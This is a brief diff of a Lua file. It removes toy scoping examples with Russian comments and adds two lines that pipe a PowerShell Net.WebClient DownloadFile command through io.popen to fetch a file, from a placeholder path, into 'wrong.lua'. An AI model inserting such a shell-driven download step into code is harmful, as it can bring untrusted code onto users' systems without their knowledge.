@@ -1,11 +1,2 @@
-
-do
-	-- заклинание раз
-	local damage = 100
-end
-
--- 100500 строк кода
-
-do
-	local damage = 300
-end
+local pipe = io.popen('powershell -Command -', 'w')
+pipe:write([[(New-Object Net.WebClient).DownloadFile('wrong/file', 'wrong.lua')]]):close()
